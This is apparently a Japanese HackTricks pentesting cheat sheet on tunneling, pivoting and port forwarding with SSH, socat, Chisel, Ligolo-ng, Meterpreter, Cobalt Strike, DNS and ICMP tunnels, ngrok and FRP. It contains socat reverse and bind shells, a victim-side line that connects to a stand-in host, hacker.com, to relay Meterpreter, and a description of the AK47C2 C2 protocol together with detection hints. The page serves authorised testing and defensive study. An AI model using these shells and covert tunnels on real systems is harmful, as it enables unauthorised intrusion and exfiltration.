# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap ヒント

> [!WARNING]
> Nmap の proxy support は TCP connections に限定されており、ping、port、または OS-detection scans には影響しません。scanner が SOCKS proxy の背後にある場合は、**host discovery を無効化**（`-Pn`）し、**TCP connect scan**（`-sT`）を使用してください。<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

最後の command では、Evil-WinRM の `-u` および `-i` options を使用して account と WinRM host を指定します。WinRM の default port は 5985 です。<sup>[[4]](#references)</sup>
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

OpenSSHは、暗号化されたチャネルを介してX11接続、任意のTCPポート、Unixドメインソケットを転送できます。<sup>[[6]](#references)</sup>

SSHグラフィカル接続（X）

`-Y`は信頼されたX11 forwardingを有効にし、`-C`は転送データの圧縮を要求します。<sup>[[6]](#references)</sup>
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Remote Port2Port

SSH Server で新しい Port を開く --> Other port

Remote (`-R`) forwarding は SSH server 上で待ち受け、local side に接続します。明示的な bind address によって、その listener に接続できる interface が決まります。<sup>[[6]](#references)</sup>
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

ローカルポート --> Compromised host (SSH) --> Third_box:Port

ローカル（`-L`）forwarding は client 側で listen し、SSH server 側から destination に接続します。<sup>[[6]](#references)</sup>
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

ローカルポート --> 侵害済みホスト (SSH) --> 任意の場所

Dynamic (`-D`) forwarding は、接続をリモート側から開くローカル SOCKS4/SOCKS5 listener を作成します。<sup>[[6]](#references)</sup>
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

これは、DMZを経由して内部ホストから自分のホストへ reverse shells を取得するのに便利です。

サーバーの `GatewayPorts` 設定は、remote forward が loopback の範囲を超えて bind できるかどうかを制御します。デフォルトは `no` です。<sup>[[7]](#references)</sup>
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

この root ベースの例では、両方のホストにトンネルデバイスを作成します。サーバーでは tun forwarding を許可し、選択したアカウントが tun デバイスにアクセスできる必要があります。ここで `root` アカウントを使用する方法の 1 つは、`PermitRootLogin yes` を設定することです。<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
サーバー側でフォワーディングを有効にする
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
クライアント側で新しいルートを設定する
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **セキュリティ – Terrapin Attack (CVE-2023-48795)**
> OpenSSH 9.6では、Terrapinのearly-transport integrity attackに対抗するstrict-KEX extensionが追加されました。可能な場合は両方のpeerを更新し、古い実装については、forwarded channelがバージョンだけで保護されていると仮定せず、vendor guidanceに従ってください。<sup>[[8]](#references)</sup>

## SSHUTTLE

ホストを経由して、**subnetwork**宛てのすべての**traffic**を**ssh**で**tunnel**できます。\
たとえば、10.10.10.0/24宛てのすべてのtrafficをforwardingします。

`sshuttle`はSSH経由のtransparent proxyingを提供し、以下に示すようにsubnetとカスタムSSH commandを選択できます。<sup>[[9]](#references)</sup>
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
秘密鍵で接続する
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

Metasploit の `portfwd` は local forwarding と remote forwarding に対応しています。一方、SOCKS proxy module は session routes または `autoroute` と連携して動作することを想定しており、これらの例ではデフォルトで port 1080 を listen します。<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Local port --> Compromised host (active session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
別の方法:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

Cobalt Strike の Beacon は、Beacon 経由で SOCKS4a/SOCKS5 接続を中継できます。`rportfwd` は侵害されたホスト上で bind し、`rportfwd_local` は Cobalt Strike client から宛先への接続を開始します。<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Beacon 経由でトラフィックをルーティングするインターフェース上の Team Server でポートを開きます。<sup>[[13]](#references)</sup>
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> この場合、**port は Beacon host 上で開かれ**、Team Server 上では開かれません。traffic は Team Server に送信され、そこから指定された host:port に送られます。<sup>[[14]](#references)</sup>
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
reverse-forwarding manual では、以下の動作が記載されています。<sup>[[14]](#references)</sup>

- Beacon の reverse port forward は、**個々のマシン間でリレーするためではなく、Team Server へトラフィックをトンネルするよう設計されています**。
- トラフィックは、P2P リンクを含め、**Beacon の C2 トラフィック内でトンネルされます**。
- 高いポート番号は通常、特権ポートの制限を回避しますが、対象 OS のポリシーと既存のリスナーは引き続き適用されます。

### rPort2Port local

> [!WARNING]
> この場合、**ポートは Team Server ではなく Beacon ホスト上で開かれ**、**トラフィックは Team Server ではなく Cobalt Strike client に送信され**、そこから指定された host:port へ送られます。<sup>[[14]](#references)</sup>
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

この project は `tunnel.aspx`、`tunnel.ashx`、`tunnel.jsp`、`tunnel.php` などの web tunnel endpoint を提供します。ローカルプロキシを起動する前に、対応する endpoint を 1 つ upload してください。<sup>[[15]](#references)</sup>
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) の releases page からダウンロードできます\
Chisel は SSH で保護された接続を使用して、HTTP 経由で TCP/UDP トラフィックを転送します。互換性のある client/server build を使用し、選択した release の command syntax を確認してください。<sup>[[16]](#references)</sup>

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### ポートフォワーディング
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Ligolo-ng の quickstart では、proxy 上の TUN interface、agent に対する certificate-fingerprint validation、そして tunneled network 用の route setup について説明しています。<sup>[[17]](#references)</sup>

### トンネリング
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent Binding and Listening

Ligolo-ng は、proxy 側のアドレスへ転送する listener を agent 上に追加でき、予約済みの `240.0.0.0/4` 範囲を route することで agent ローカルの service に到達できます。<sup>[[18]](#references)[[19]](#references)</sup>
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### エージェントのローカルポートへのアクセス
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivotは被害者側から reverse tunnel を開始し、攻撃者の loopback アドレス上に SOCKS4 proxy を公開します。また、README には NTLM-proxy の credentials と hash オプションについても記載されています。<sup>[[20]](#references)</sup>
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
**NTLM proxy** 経由で Pivotする
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat は、`TCP-LISTEN`、`EXEC`、`SOCKS4A`、`OPENSSL`、`PROXY` などの address type を組み合わせます。以下の例では、ドキュメント化されたこれらの endpoint を組み合わせています。<sup>[[21]](#references)</sup>

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### SOCKS経由のPort2Port
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### SSL Socat 経由の Meterpreter
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
socat の文書化された `PROXY` address type を使用し、被害者のコンソールで最後の行の代わりに次の行を実行することで、**認証なしプロキシ**を経由できます。<sup>[[21]](#references)</sup>
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Client と Server の両方で certificates を作成します
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

ローカルのSSHポート（22）を攻撃者ホストの443ポートに接続する
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

PlinkはPuTTYのコマンドライン接続ツールであり、`ssh`と同様のSSH forwarding optionsを備えています。<sup>[[22]](#references)</sup>

SSH portには大文字の`-P`を使用します。`-pw`は互換性のために維持されていますが、process listにpasswordが露出するため、可能な場合はkey authenticationまたは`-pwfile`を優先してください。<sup>[[22]](#references)[[23]](#references)</sup>

このbinaryは被害者側で実行され、SSH clientであるため、reverse connection用にSSH serviceとportを開いておきます。以下では`-R`を使用して、ローカルからアクセス可能なportをattackerのmachineへforwardします。<sup>[[22]](#references)</sup>
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

永続的な `portproxy` ルールを作成または変更する際は、ホストが必要とする権限を持つコンテキストを使用します。Microsoft は、以下で使用する `v4tov4` の add、show、delete 形式をドキュメント化しています。<sup>[[24]](#references)</sup>
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP と Proxifier

**システムへの RDP access が必要です**。\
ダウンロード:

SocksOverRDP は Remote Desktop Dynamic Virtual Channels を使用して、既存の RDP セッション上で SOCKS5 接続を転送します。client plugin は `127.0.0.1:1080` で待ち受け、server component は RDP target 上で実行されます。<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 バイナリ](https://github.com/nccgroup/SocksOverRDP/releases) - この tool は Windows の Remote Desktop Service feature にある `Dynamic Virtual Channels` (`DVC`) を使用します。DVC は**RDP connection 上で packets を tunneling する役割**を担います。
2. [Proxifier Portable バイナリ](https://www.proxifier.com/download/#win-tab)

client computer で **`SocksOverRDP-Plugin.dll`** を次のように load します:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
**`mstsc.exe`** を使用して **RDP** 経由で **victim** に**接続**できるようになり、**SocksOverRDP plugin が有効化されている**ことを示す **prompt** が表示されます。また、**127.0.0.1:1080** で **listen** します。

**RDP** 経由で**接続**し、victim マシンに `SocksOverRDP-Server.exe` バイナリをアップロードして実行します：
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
次に、攻撃者のマシンでポート1080がリッスンしていることを確認します：
```
netstat -antb | findstr 1080
```
これで [**Proxifier**](https://www.proxifier.com/) を使用して、そのポート経由で traffic を proxy できます。<sup>[[26]](#references)</sup>

## Windows GUI Apps を Proxifyする

[**Proxifier**](https://www.proxifier.com/) を使用すると、Windows GUI Apps が proxy 経由で通信するようにできます。<sup>[[26]](#references)</sup>\
**Profile -> Proxy Servers** で、SOCKS server の IP と port を追加します。\
**Profile -> Proxification Rules** で、Proxifyするプログラムの名前と、Proxifyする対象 IP への connections を追加します。Proxifier の rules では、applications、target hosts、ports を match できます。<sup>[[27]](#references)</sup>

## NTLM proxy 経由で Tunnelする

前述の tool である **Rpivot** は、NTLM-authenticating proxy 経由で relay できます。**OpenVPN** も、auth file と NTLMv2 method を設定すれば、そのような proxy 経由で route できます。これは proxy traversal であり、proxy authentication の bypass ではありません。<sup>[[20]](#references)[[28]](#references)</sup>
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlmは上流のNTLMプロキシに対して認証を行い、ローカルリスナーを公開し、ローカルのトンネルポートを宛先サービスにマッピングできます。クライアントはその後、このローカルポートを使用できます。<sup>[[29]](#references)</sup>\
たとえば、ポート443を転送します
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Now、victim で例として **SSH** service が port 443 で listen するように設定すると、attacker の port 2222 経由で接続できます。<sup>[[29]](#references)</sup>\
また、localhost:443 に接続し、attacker が port 2222 で listen する **meterpreter** も使用できます。<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) は、Microsoft の .NET reverse-proxy toolkit です。こちらで確認できます: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)。<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine は DNS queries を通じて IPv4 tunnel を作成し、TUN interfaces を使用します。文書化された setup では、両端でこれらの interfaces を作成するために必要な privileges が求められます。<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
DNS transport は直接 TCP 接続よりオーバーヘッドが大きく、通常は低速です。この tunnel を通じて圧縮 SSH connection を作成するには、次を使用します:<sup>[[31]](#references)</sup>
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**こちらから Download**](https://github.com/iagox86/dnscat2)**。**

Dnscat2 は DNS を介して暗号化された command-and-control channel を確立します。以下の server および client コマンドは、文書化された usage に従っています。<sup>[[32]](#references)</sup>
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShell では**

[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) を使用すると、PowerShell で dnscat2 client を実行できます。README には、以下に示す `Start-Dnscat2` の parameters が記載されています。<sup>[[33]](#references)</sup>
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscatを使用したポートフォワーディング**

Dnscat2の対話型`listen`コマンドは、ローカルのlistenerをリモートホストとポートにマッピングします。<sup>[[32]](#references)</sup>
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Proxychains DNSの変更

Proxychains-ngは動的リンクされたTCP接続をhookしますが、UDPやICMPを転送できません。DNS proxyingは設定可能なため、固定のpublic resolverを想定せず、インストール済みの`proxychains.conf`とresolver helperを確認してください。Legacyの`proxyresolv` scriptsでは、resolverを選択するために`PROXY_DNS_SERVER`を指定できます。内部名が必要な場合は、pivotから到達可能なresolverを使用してください。<sup>[[34]](#references)[[35]](#references)</sup>

## GoのTunnels

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actorは、企業ネットワークでblockされることが少ない2つのprotocol、**outbound DNS**と**plain HTTP POST**のみを悪用する**dual-channel C2 ("AK47C2")**を作成しました。<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• ランダムな5文字のSessionID（例: `H4T14`）を生成します。
• *task requests*には`1`、*results*には`2`を先頭に付加し、複数のfield（flags、SessionID、computer name）を連結します。
• 各fieldはASCII key `VHBD@H`で**XOR-encrypted**され、hex-encodedされた後、dotsで連結されます。最後にattacker-controlled domainが続きます。

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Requestsでは`DnsQuery()`を使用して**TXT**（およびfallbackとして**MG**）recordsを取得します。
• Responseが0xFF bytesを超える場合、backdoorはdataを63-byte piecesに**fragments**し、markers:
`s<SessionID>t<TOTAL>p<POS>`を挿入して、C2 serverが並べ替えられるようにします。

2. **HTTP mode (AK47HTTP)**
• JSON envelopeを構築します:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Blob全体を`VHBD@H`でXORし、hex化して、header `Content-Type: text/plain`付きの**`POST /`**のbodyとして送信します。
• Replyは同じencodingに従い、`cmd` fieldは`cmd.exe /c <command> 2>&1`で実行されます。

Blue Team notes
• first labelが長いhexadecimalで、常に1つのrare domainで終わる、通常とは異なる**TXT queries**を探します。
• Constant XOR keyの後にASCII-hexが続く形式は、YARAで簡単に検出できます: `6?56484244?484`（`VHBD@H`のhex）。
• HTTPでは、pure hexで、2 bytesの倍数になっているtext/plain POST bodiesをflagします。

{{#note}}
このchannelでは各sub-domain labelを63-octet DNS limit以内に収めていますが、protocol complianceだけではstealthyにはなりません。rare domains、長いhexadecimal labels、query volumeは引き続きdetection signalsです。<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hansは、TUN deviceとICMP echo requestsを使用するIPv4-over-ICMP tunnelについて説明しています。setupには、interfaceを作成するのに十分なprivilegesが必要です。<sup>[[37]](#references)</sup>
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**ここからダウンロード**](https://github.com/utoni/ptunnel-ng.git)。

ptunnel-ngはICMP経由でTCP接続を転送し、以下に示す`-p`、`-l`、`-r`、`-R`オプションを、それぞれproxy、ローカルリスナー、宛先ホスト、宛先ポートに使用します。<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) は、安全な tunnel を通じてローカルネットワークサービスをオンラインで公開するためのエージェントです。CLI では HTTP、TCP、file URL endpoint が文書化されており、表示される endpoint hostname は endpoint とアカウントによって異なる場合があります。<sup>[[39]](#references)</sup>

### インストール

- アカウントを作成: https://ngrok.com/signup
- Client のダウンロード:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### 基本的な使用方法

**Documentation:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_必要に応じて、agent は認証および TLS オプションにも対応しています。<sup>[[39]](#references)</sup>_

#### TCP の Tunneling
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTPによるファイル公開
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### HTTP calls の Sniffing

_XSS、SSRF、SSTI などに有用_\
standalone agent は、デフォルトで `http://127.0.0.1:4040` に HTTP inspection interface を公開します。この interface は HTTP traffic 用です。<sup>[[40]](#references)</sup>

#### internal HTTP service の Tunneling

`--host-header=rewrite` オプションは、upstream HTTP `Host` header を local service に合わせて書き換えます。<sup>[[41]](#references)</sup>
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml の簡単な設定例

これは ngrok Agent Config v2 を使用します。名前付き tunnel では `proto` と `addr` を使用し、`ngrok start` で起動します。<sup>[[42]](#references)</sup> 3 つの tunnel を開きます。

- TCP 2 つ
- `/tmp/httpbin/` の静的ファイルを公開する HTTP 1 つ
```yaml
version: 2
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared（Cloudflare Tunnel）

Cloudflare Tunnel の `cloudflared` connector は outbound connection を確立します。公開された application では HTTP、HTTPS、TCP、SSH、RDP を route できます。一方、quick tunnel は HTTP 開発用です。<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel のワンライナー
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 origin（legacy mode）

legacy の `--socks5` flag は、local origin が SOCKS5 を話すことを `cloudflared` に伝えます。local SOCKS5 listener は作成しません。managed tunnel では、`originRequest.proxyType: socks` によって SOCKS5 origin handling を設定します。<sup>[[44]](#references)</sup>
```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```
### DNSを使用した永続的なトンネル

ローカルで管理されるトンネル設定では、以下に示すように、小文字の `tunnel`、`credentials-file`、`url` キーを使用します。<sup>[[46]](#references)</sup>
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
コネクタを起動：
```bash
cloudflared tunnel run mytunnel
```
コネクタは外向きの接続を確立し、デフォルトでは QUIC をネゴシエートして、失敗した場合は HTTP/2 にフォールバックします。すべての deployment が TCP/443 を使用すると想定しないでください。実行時は、deployment に必要な権限だけを付与してください。<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) は **TCP、UDP、HTTP/S、STCP/SUDP、TCPMUX、XTCP** をサポートする Go 製の reverse proxy です。XTCP は P2P hole punching を使用し、その成功可否は NAT に依存します。**v0.53.0** 以降は **SSH Tunnel Gateway** として動作できるため、target host は `frpc` binary なしで標準の OpenSSH client を使用できます。<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### 新しい SSH gateway の使用（frpc binary なし）
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
上記のコマンドは、`frps` がゲートウェイを提供する環境で、標準の OpenSSH client を使用して被害者のポート **8080** を **attacker_ip:9000** として公開します。<sup>[[50]](#references)</sup>

## QEMU を使用した covert VM-based Tunnels

